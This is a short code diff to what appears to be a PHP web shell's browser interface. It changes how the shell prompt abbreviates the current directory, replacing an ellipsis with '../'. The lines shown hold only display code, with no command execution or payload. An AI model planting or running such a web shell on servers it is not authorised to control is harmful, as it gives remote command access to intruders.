@@ -460,7 +460,7 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "../" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
                 return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
